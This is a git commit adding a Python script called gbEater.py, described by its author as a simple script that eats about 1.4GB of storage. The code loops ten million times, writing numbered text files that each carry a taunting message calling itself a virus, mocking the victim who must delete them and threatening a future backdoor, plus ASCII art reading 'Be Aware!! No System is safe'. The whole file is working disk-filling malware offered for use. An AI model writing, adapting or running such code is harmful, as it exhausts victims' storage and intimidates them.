abceee2fa799f62aa8d9d9e7e5e716bff2e03fee
RizanTMG <69302502+RizanTMG@users.noreply.github.com>
2020-12-15 08:41:38 +0545

    Create gbEater.py
    This is the script, it is pretty simple!
    Try to modify it but dont use it for bad use!
    The default script will eat about 1.4GB of storage!
    The script creates new txt files and writes the text in the:
    file.write() line. 
    It renames the files to be 0.txt, 1.txt and so along!

---
+++ gbEater.py
@@ -0,0 +1,45 @@
+a = "0"
+# file = open(a + ".txt", "w")
+
+print ("Check Your Storage!!")
+
+for i in range(10000000):
+        a = int(a)
+        a += 1
+        a = str(a)
+        file = open(a + ".txt", "w")
+        file.write("""Sry but there are many files now!!
+And Have a good ti,e deletimg them!!
+Thia is a simple virus which will only eat your storage!!
+This will not do any other harm!!
+Sry for the trouble but this just for fun no personal revenge or anything!
+Hope yoi foegive me!!
+
+Your 1 GB will be eaten!!
+Nothing much!
+Be aware Next time I may also include a backdoor to your device!!
+To have an eye on you!!
+
+
+  ____                                       _ _
+ |  _ \           /\                        | | |
+ | |_) | ___     /  \__      ____ _ _ __ ___| | |
+ |  _ < / _ \   / /\ \ \ /\ / / _` | '__/ _ \ | |
+ | |_) |  __/  / ____ \ V  V / (_| | | |  __/_|_|
+ |____/ \___| /_/    \_\_/\_/ \__,_|_|  \___(_|_)
+
+
+
+  _   _          _____           _                   _                  __
+ | \ | |        / ____|         | |                 (_)                / _|
+ |  \| | ___   | (___  _   _ ___| |_ ___ _ __ ___    _ ___   ___  __ _| |_ ___
+ | . ` |/ _ \   \___ \| | | / __| __/ _ \ '_ ` _ \  | / __| / __|/ _` |  _/ _ \
+ | |\  | (_) |  ____) | |_| \__ \ ||  __/ | | | | | | \__ \ \__ \ (_| | ||  __/
+ |_| \_|\___/  |_____/ \__, |___/\__\___|_| |_| |_| |_|___/ |___/\__,_|_| \___|
+                        __/ |
+                       |___/
+
+ """)
+        file.close()
+
+b = input()
